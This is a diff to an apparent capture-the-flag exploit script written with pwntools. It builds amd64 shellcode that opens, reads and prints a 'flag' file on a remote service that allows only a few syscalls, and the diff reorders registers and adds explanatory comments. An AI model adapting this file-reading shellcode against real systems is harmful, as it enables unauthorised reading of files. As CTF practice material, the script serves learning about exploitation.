@@ -10,6 +10,8 @@ PORT = 13445
 context.update(arch= 'amd64', os='linux')
 
 def make_payload():
+    #allowed syscall numbers: 0, 1, 2, 3. These are sys_read, sys_write, sys_open, sys_close.
+    
     #assembly to read flag
     #The arguments are passed in this order: rdi, rsi, rdx, and the system call number goes in rax.
 
@@ -20,7 +22,8 @@ def make_payload():
     #the returned file descriptor: in rax. It becomes first argument of the read (syscall 0 in rax)
     #the 2nd argument is the buffer, we use the same string that contained flag, pointed by the sp, and 3rd argument n bytes to read, 100
     #again, result of the read (bytes read) into rax
-    #now call the write, first arg n_bytes to write, then the fd to write (1= stdout), then syscall num = 1
+    #now call the write, first arg fd to write (1= stdout), 2nd buffer of data to write (sp, already set in rsi from last call), 
+    #then number of bytes to write (returned by the read in rax) then syscall num = 1
 
     shellcode_asm = """
         /* 1. Open 'flag' */
@@ -39,8 +42,8 @@ def make_payload():
         syscall
 
         /* 3. Write(1, stack, len) */
-        mov rdx, rax
         mov rdi, 1
+        mov rdx, rax
         mov rax, 1
         syscall
     """
@@ -55,9 +58,8 @@ def make_payload():
 def main():
 
     io = remote(HOST, PORT)
-    g = io.recvuntil(b'Be careful, we have some restrictions in place...\n')
-    print(g)
-    
+    io.recvuntil(b'Be careful, we have some restrictions in place...\n')
+
     payload = make_payload()
     io.sendline(payload)
 
